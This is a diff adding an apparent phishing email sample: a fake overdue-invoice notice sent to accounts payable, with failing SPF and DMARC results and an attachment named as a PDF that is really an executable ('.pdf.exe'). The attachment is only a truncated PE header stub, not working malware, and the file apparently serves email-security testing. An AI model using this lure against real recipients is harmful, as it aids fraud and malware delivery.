@@ -1,0 +1,27 @@
+From: "Billing Dept" <accounts@supplier-invoices.com>
+To: accounts-payable@company.com
+Subject: OVERDUE INVOICE #98231 - Payment Required Immediately
+Date: Sun, 15 Nov 2026 01:50:00 +0000
+Message-ID: <20261115015000.77123.inv@supplier-invoices.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_Att_889900"
+Authentication-Results: mx.company.com;
+    spf=fail (sender IP is 103.145.13.20);
+    dkim=none;
+    dmarc=fail action=none
+
+------=_Part_Att_889900
+Content-Type: text/plain; charset=UTF-8
+
+Please find attached the past due invoice statement for services rendered last month.
+Remit payment immediately to avoid collection agencies.
+
+------=_Part_Att_889900
+Content-Type: application/octet-stream; name="Overdue_Invoice_98231.pdf.exe"
+Content-Disposition: attachment; filename="Overdue_Invoice_98231.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAsAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+------=_Part_Att_889900--
